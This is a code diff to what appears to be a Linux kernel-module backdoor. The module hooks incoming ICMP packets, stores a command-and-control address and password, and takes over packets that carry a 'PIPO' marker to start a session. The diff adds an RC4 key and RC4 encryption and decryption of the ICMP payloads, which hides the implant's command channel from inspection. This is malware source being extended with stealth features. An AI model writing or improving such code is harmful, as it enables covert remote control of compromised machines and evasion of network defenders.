@@ -19,6 +19,7 @@
 #include "context.h"
 #include "response.h"
 #include "handler.h"
+#include "crypto.h"
 
 #define ICMP_PROTOCOL 1
 
@@ -28,6 +29,9 @@ static void init_globals(void) {
     memset(context, 0, sizeof(struct Context));
     context->config.c2addr = in_aton(C2_ADDR);
     strcpy(context->config.password, PASSWORD);
+
+    context->config.rc4_key_length = RC4_KEY_LENGTH;
+    memcpy(context->config.rc4_key, RC4_KEY, RC4_KEY_LENGTH);
 
     printk(KERN_INFO "[CONFIG] c2addr %d, password %s", context->config.c2addr, context->config.password);
     return;
@@ -73,10 +77,11 @@ static unsigned int icmp_hook_func(void *priv, struct sk_buff *recv_skb, const s
             recv_icmp_data = (unsigned char *)(recv_icmph + 1);
             icmp_data_len = recv_skb->len - sizeof(struct iphdr) - sizeof(struct icmphdr);
             // printk(KERN_INFO "Received ICMP packet (type %d, ip src, %u, ip src %u, data %s)\n", recv_icmph->type, recv_iph->saddr, recv_iph->daddr, recv_icmp_data);
+            rc4_crypt(&context->config, recv_icmp_data, icmp_data_len);
 
             if (memcmp(recv_icmp_data, "PIPO", 4) == 0 && context->handler_handling == 0) {
                 if (context->in_session && (context->saddr != context->session_saddr)) {
-                    printk("Failed one");
+                    rc4_crypt(&context->config, recv_icmp_data, icmp_data_len);
                     return NF_ACCEPT;
                 };
                 memcpy(context->smac, recv_ethh->h_dest, ETH_ALEN);
@@ -89,6 +94,7 @@ static unsigned int icmp_hook_func(void *priv, struct sk_buff *recv_skb, const s
                 schedule_work(&context->my_work);
                 return NF_STOLEN;
             } else {
+                rc4_crypt(&context->config, recv_icmp_data, icmp_data_len);
                 //printk(KERN_INFO "[WRONG PASSWORD] Received ICMP packet (type %d, ip src, %d, ip dst %d, data %s)\n", recv_icmph->type, recv_iph->saddr, recv_iph->daddr, recv_icmp_data);
 
             }
